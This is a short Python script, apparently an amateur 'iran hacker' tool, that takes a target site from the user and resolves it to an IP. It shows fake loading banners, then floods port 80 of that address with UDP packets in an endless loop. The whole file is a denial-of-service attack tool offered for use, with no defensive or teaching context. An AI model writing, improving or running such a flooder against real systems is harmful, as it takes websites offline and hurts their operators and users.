import os
import time
import socket
from colorama import Fore
os.system("clear") 
print("iran Anonymos")
time.sleep(5)
red='\033[31m'
green='\033[32m'
os.system("clear")
os.system("toilet -f mono12 -F gay iran hacker")

print("iranAnonymos tem my name  :  yen yang majaze              ip your target")
time.sleep(3)
target = input(f"{green} : ")
target.replace("http://", "")
target.replace("https://","")
target.replace("www.","")
ip = socket.gethostbyname(target)
port = 80
joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhygggghhhhhhhhh"
os.system("clear")
os.system("toilet -f mono12 -F gay iran loading... ")
print(Fore.YELLOW+"chek{.......... }5%")
time.sleep(1)
os.system("clear") 
print(Fore.GREEN+"Security{yen yang... }10%")
time.sleep(2)
os.system("clear") 
print(Fore.WHITE+"Loading{yen yang majaze}40%")
time.sleep(3)
os.system("clear") 
print(Fore.BLUE+"amade saze{yen yang majaze..}90%")
time.sleep(3)
os.system("clear") 
print(Fore.GREEN+"goooooooooo{.............................. 100%")
time.sleep(4)
os.system("clear") 
print(Fore.RED+"please wait")
time.sleep(6)
os.system("clear")
os.system("figlet Attack_Starting")
while True:
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(bytes(joker,"UTF-8"), (ip,port))
     print(port," packet to site ",ip)
